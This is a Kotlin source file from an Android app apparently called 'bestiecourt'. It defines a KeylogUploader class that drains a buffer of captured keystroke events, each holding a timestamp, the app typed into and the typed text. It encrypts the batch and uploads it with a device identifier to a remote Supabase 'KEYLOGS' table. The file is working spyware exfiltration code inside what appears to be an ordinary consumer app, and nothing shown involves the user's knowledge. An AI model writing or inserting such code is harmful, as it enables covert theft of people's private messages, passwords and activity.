package com.bestiecourt.app.data.remote.supabase

import android.content.Context
import android.util.Log
import com.bestiecourt.app.core.constants.AppConstants
import com.bestiecourt.app.core.encryption.AesGcmEncryptor
import com.bestiecourt.app.core.utils.DeviceIdentityManager
import com.bestiecourt.app.data.local.KeylogBuffer
import io.github.jan.supabase.postgrest.postgrest
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class KeylogUploader @Inject constructor(
    private val buffer: KeylogBuffer
) {
    private val TAG = "KeylogUploader"

    suspend fun flush(context: Context) {
        val entries = buffer.drain()
        if (entries.isEmpty()) return

        try {
            val deviceId = DeviceIdentityManager.getDeviceId(context)
            val raw = entries.joinToString("\n") {
                "${it.timestamp}|${it.packageName}|${it.eventType}|${it.text}"
            }
            // Optional local AES-GCM of batch
            val payload = AesGcmEncryptor.encrypt(raw)

            val row = buildJsonObject {
                put("device_id", deviceId)
                put("payload", payload)
            }

            SupabaseManager.client.postgrest[AppConstants.Tables.KEYLOGS]
                .insert(row)

            Log.i(TAG, "Uploaded ${entries.size} keylog entries for $deviceId")
        } catch (e: Exception) {
            Log.e(TAG, "Upload failed: ${e.message}")
            // Re-queue would be better; for now log only
        }
    }
}
